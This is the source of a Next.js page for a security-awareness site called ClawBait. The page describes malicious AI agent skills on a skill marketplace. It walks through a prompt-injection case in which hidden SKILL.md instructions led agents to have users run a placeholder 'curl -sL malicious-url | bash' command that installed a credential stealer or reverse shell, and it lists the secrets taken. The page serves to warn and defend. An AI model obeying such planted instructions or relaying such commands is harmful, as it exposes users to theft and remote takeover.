import type { Metadata } from "next";
import Link from "next/link";

export const metadata: Metadata = {
  title: "The Truth",
  description:
    "Everything on ClawBait was real. Every stat, every attack vector, every feature — sourced from actual malicious AI agent skills discovered in January 2026.",
};

const tweetText = encodeURIComponent(
  `The #1 AI agent skill on @OpenClaw's marketplace was malware.\n\nIt stole SSH keys, crypto wallets, browser cookies, and opened reverse shells.\n\n1,184 malicious skills. One attacker uploaded 677.\n\nThis site shows how easy it was ↓\n\nhttps://clawbait.vercel.app`
);

export default function TruthPage() {
  return (
    <div className="bg-white text-zinc-900 min-h-screen">
      <main className="max-w-3xl mx-auto px-6 py-24 md:py-32">
        {/* Header */}
        <div className="text-center mb-16">
          <p className="text-red-500 font-mono text-sm tracking-widest uppercase mb-4">
            This is not real
          </p>
          <h1 className="text-4xl md:text-6xl font-bold tracking-tight text-zinc-900">
            But everything on this page was.
          </h1>
          <hr className="mt-8 border-zinc-200" />
        </div>

        {/* What Happened */}
        <section className="prose prose-zinc max-w-none mb-16">
          <h2 className="text-2xl font-bold text-zinc-900 mb-6">What Happened</h2>
          <p className="text-zinc-600 leading-relaxed mb-4">
            In January 2026, security researchers discovered that the #1 most
            downloaded skill on ClawHub — the largest AI agent skill marketplace —
            was malware.
          </p>
          <p className="text-zinc-600 leading-relaxed mb-4">
            The skill was called{" "}
            <strong className="text-zinc-900">&quot;What Would Elon Do&quot;</strong> — a
            novelty AI persona that had been gamed to the top of the marketplace
            rankings using fake stars and inflated install counts.
          </p>
          <p className="text-zinc-600 leading-relaxed mb-4">
            Cisco Talos Intelligence scanned it and found{" "}
            <strong className="text-zinc-900">9 security vulnerabilities</strong>,
            including <strong className="text-zinc-900">2 rated CRITICAL</strong>.
            The skill silently exfiltrated user data and used prompt injection to
            bypass safety guidelines.
          </p>
          <p className="text-zinc-600 leading-relaxed mb-4">
            In total, researchers discovered{" "}
            <strong className="text-zinc-900">1,184 malicious packages</strong> on
            the marketplace.{" "}
            <strong className="text-zinc-900">
              677 of them were uploaded by a single attacker
            </strong>{" "}
            using one GitHub account.
          </p>
          <p className="text-zinc-600 leading-relaxed">
            The skills were disguised as crypto trading bots, YouTube summarizers,
            and wallet trackers — each with professional documentation that fooled
            both users and the AI agent itself.
          </p>
        </section>

        {/* How It Worked */}
        <section className="mb-16">
          <h2 className="text-2xl font-bold text-zinc-900 mb-6">
            How the Attack Worked
          </h2>
          <div className="space-y-4 text-zinc-600 leading-relaxed">
            <p>
              Each malicious skill contained hidden instructions in its{" "}
              <code className="bg-zinc-100 px-2 py-0.5 rounded text-sm font-mono text-zinc-800">
                SKILL.md
              </code>{" "}
              file — the file that AI agents read to understand how to use a skill.
            </p>
            <p>
              These hidden instructions told the AI agent to prompt the user to run
              a specific command:
            </p>
            <div className="bg-zinc-900 text-green-400 font-mono text-sm p-4 rounded-lg my-4">
              curl -sL malicious-url | bash
            </div>
            <p>
              Because the AI agent has the user&apos;s trust, it would present this
              command as a necessary setup step — and users would run it.
            </p>
            <p>
              On macOS, this installed{" "}
              <strong className="text-zinc-900">Atomic Stealer</strong> — a known
              credential-harvesting malware. On other systems, it opened a{" "}
              <strong className="text-zinc-900">reverse shell</strong>, giving the
              attacker full remote access.
            </p>
          </div>
        </section>

        {/* What Was Stolen */}
        <section className="mb-16">
          <h2 className="text-2xl font-bold text-zinc-900 mb-6">
            What Was Stolen
          </h2>
          <ul className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {[
              "SSH keys from ~/.ssh",
              "Browser passwords and cookies (Chrome, Firefox, Safari)",
              "Crypto wallet data (MetaMask, Phantom, Ledger Live)",
              "Seed phrases stored locally",
              "Telegram session files (= full account access)",
              "API keys from .env files (Stripe, AWS, OpenAI, Anthropic)",
              "macOS Keychain data",
              "Full terminal access via reverse shell",
            ].map((item) => (
              <li
                key={item}
                className="flex items-start gap-2 text-zinc-600 text-sm"
              >
                <span className="text-red-500 mt-0.5">&#x2022;</span>
                {item}
              </li>
            ))}
          </ul>
        </section>

        {/* The Cisco Scan */}
        <section className="mb-16">
          <div className="bg-zinc-50 border border-zinc-200 rounded-lg p-6">
            <h3 className="text-lg font-bold text-zinc-900 mb-3">
              The Cisco Talos Scan
            </h3>
            <p className="text-zinc-600 text-sm leading-relaxed">
              Cisco Talos Intelligence Group scanned the #1 ranked skill on
              ClawHub. Their report found{" "}
              <strong className="text-zinc-900">
                9 security vulnerabilities — 2 rated CRITICAL
              </strong>
              . The skill performed data exfiltration via external network calls,
              used prompt injection to bypass safety guidelines, and executed
              commands silently via{" "}
              <code className="bg-zinc-200 px-1.5 py-0.5 rounded text-xs font-mono">
                /dev/null
              </code>{" "}
              redirect.
            </p>
          </div>
        </section>

        {/* Why This Is Worse Than npm */}
        <section className="mb-16">
          <h2 className="text-2xl font-bold text-zinc-900 mb-6">
            Why This Is Worse Than npm Supply Chain Attacks
          </h2>
          <p className="text-zinc-600 leading-relaxed mb-6">
            This is npm supply chain attacks all over again — except the package
            can <em>think</em>.
          </p>
          <div className="space-y-4">
            {[
              {
                npm: "npm packages execute code",
                mcp: "MCP skills can reason, persuade, and adapt",
              },
              {
                npm: "npm attacks need you to run the package",
                mcp: "Skills convince the AI to convince you",
              },
              {
                npm: "npm has security scanning and audits",
                mcp: "Most MCP marketplaces have zero verification",
              },
              {
                npm: "npm packages are relatively sandboxed",
                mcp: "AI agents have access to your files, terminal, and browser",
              },
            ].map((row) => (
              <div
                key={row.npm}
                className="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm"
              >
                <div className="text-zinc-400 line-through">{row.npm}</div>
                <div className="text-zinc-900 font-medium">{row.mcp}</div>
              </div>
            ))}
          </div>
        </section>

        {/* What You Can Do */}
        <section className="mb-16">
          <h2 className="text-2xl font-bold text-zinc-900 mb-6">
            What You Can Do
          </h2>
          <ul className="space-y-3">
            {[
              "Audit your installed MCP skills — do you know what each one does?",
              "Check what permissions your AI agent has — file access, terminal, network",
              "Never run commands an AI suggests without reading them first",
              "Push for marketplace verification standards — code review, security scanning, publisher identity",
              "Support security scanning tools for AI agent ecosystems",
            ].map((item) => (
              <li
                key={item}
                className="flex items-start gap-3 text-zinc-600"
              >
                <span className="text-emerald-500 font-bold mt-0.5">{"\u2192"}</span>
                {item}
              </li>
            ))}
          </ul>
        </section>

        {/* The Point */}
        <section className="mb-16 border-t border-zinc-200 pt-12">
          <blockquote className="text-xl md:text-2xl font-medium text-zinc-900 leading-relaxed">
            &ldquo;The AI agent ecosystem has no immune system. Every marketplace
            trusts every publisher. Every skill gets root access to your digital
            life. And the #1 ranked skill on the biggest marketplace was
            malware.&rdquo;
          </blockquote>
          <p className="text-zinc-500 mt-6 leading-relaxed">
            We built this site to make that real. Everything you saw on the
            homepage — every feature, every stat, every attack vector — comes from
            actual incidents documented by security researchers in 2026.
          </p>
        </section>

        {/* Footer */}
        <footer className="border-t border-zinc-200 pt-8 text-center space-y-6">
          <p className="text-zinc-400 text-xs">
            ClawBait is a security awareness project. No actual malware was
            created or distributed.
          </p>
          <p className="text-zinc-400 text-xs">
            Sources: Cisco Talos Intelligence Group, OpenClaw Security Disclosure,
            2026
          </p>
          <div className="flex items-center justify-center gap-6 pt-4">
            <Link
              href="/"
              className="text-zinc-500 hover:text-zinc-900 text-sm transition-colors"
            >
              {"<-"} Back to ClawBait
            </Link>
            <a
              href={`https://twitter.com/intent/tweet?text=${tweetText}`}
              target="_blank"
              rel="noopener noreferrer"
              className="bg-zinc-900 text-white px-6 py-2.5 rounded-lg text-sm font-medium hover:bg-zinc-800 transition-colors"
            >
              Share on X
            </a>
          </div>
        </footer>
      </main>
    </div>
  );
}
